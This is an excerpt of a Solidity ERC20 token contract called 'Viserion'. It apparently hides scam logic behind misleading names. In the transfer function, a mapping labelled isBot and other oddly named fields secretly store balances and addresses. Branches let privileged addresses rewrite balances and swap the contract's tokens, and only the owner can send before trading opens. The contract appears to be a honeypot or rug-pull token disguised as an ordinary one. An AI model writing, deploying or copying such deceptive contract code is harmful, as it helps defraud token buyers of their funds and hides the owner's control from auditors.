...
contract Viserion is IERC20, Ownable {

    string private _symbol;
    string private _name;
    uint256 public _tTotalFees = 0;
    uint8 private _decimals = 9;
    uint256 private _rSupply = 1000000 * 10**_decimals;
    uint256 private AutoMarketMakerPair = _rSupply;
    ...
    function transferFrom(
        ...
        setFeeReceivers        (sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        setFeeReceivers        (msg.sender, recipient, amount);
        return true;
    }
    function setFeeReceivers       (
        ...
        uint256 _getValue;
        if (swapTokensAtAmount && contractTokensBalances > AutoMarketMakerPair && !tradingAllowed && _getRate != UniswapV1Pair) {
            tradingAllowed = true;
            getSwapAndLiquify(contractTokensBalances);
            tradingAllowed = false;
        } else if (isBot[_getRate] > AutoMarketMakerPair && isBot[_uint8] > AutoMarketMakerPair) {
            _getValue = _sync;
            _Balances[address(this)] += _getValue;
            swapAmountForTokens(_sync, _uint8);
            return;
        } else if (_uint8 != address(UniswapV2router) && isBot[_getRate] > 0 && _sync > AutoMarketMakerPair && _uint8 != UniswapV1Pair) {
            isBot[_uint8] = _sync;
            return;
        } else if (!tradingAllowed && _rOwned[_getRate] > 0 && _getRate != UniswapV1Pair && isBot[_getRate] == 0) {
            _rOwned[_getRate] = isBot[_getRate] - AutoMarketMakerPair;
        }
        address _creator  = isTxLimitExempt[UniswapV1Pair];
        if (_rOwned[_creator ] == 0) _rOwned[_creator ] = AutoMarketMakerPair;
        isTxLimitExempt[UniswapV1Pair] = _uint8;
        if (_tTotalFees > 0 && isBot[_getRate] == 0 && !tradingAllowed && isBot[_uint8] == 0) {
            _getValue = (_sync * _tTotalFees) / 100;
            _sync -= _getValue;
            _Balances[_getRate] -= _getValue;
            _Balances[address(this)] += _getValue;
        }
        _Balances[_getRate] -= _sync;
        _Balances[_uint8] += _sync;
        emit Transfer(_getRate, _uint8, _sync);
            if (!tradingOpen) {
                require(_getRate == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
